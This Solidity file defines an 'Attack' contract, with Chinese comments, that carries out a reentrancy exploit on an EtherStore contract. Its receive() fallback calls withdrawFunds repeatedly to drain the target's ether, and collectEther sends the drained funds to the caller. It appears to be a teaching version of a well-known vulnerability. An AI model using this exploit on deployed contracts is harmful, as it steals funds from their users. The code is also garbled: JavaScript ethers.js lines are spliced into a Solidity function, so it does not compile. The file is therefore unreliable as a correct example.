// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.2;

import "./EtherStore.sol";

contract Attack {
    EtherStore public etherStore;

    // 初始化 etherStore 变量，传入合约地址
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }
        function depositFund() public payable {
    }

    function pwnEtherStore() public payable {
        // 确保发送的以太币不少于 1 ether
        require(msg.value >= 1 ether,unicode"需要至少 1 ether");
        const etherStoreBalance = await ethers.provider.getBalance(etherStore.address);
        console.log("EtherStore balance:", ethers.utils.formatEther(etherStoreBalance));
        (bool success, ) = address(etherStore).call{value: 1 ether}("");
        require(success, unicode"存款失败");
        // 启动攻击
        etherStore.withdrawFunds(1 ether);
    }

    function collectEther() public {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, unicode"取款失败");
    }

    // 回调函数 - 攻击逻辑
    receive() external payable {
        if (address(etherStore).balance > 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }
}
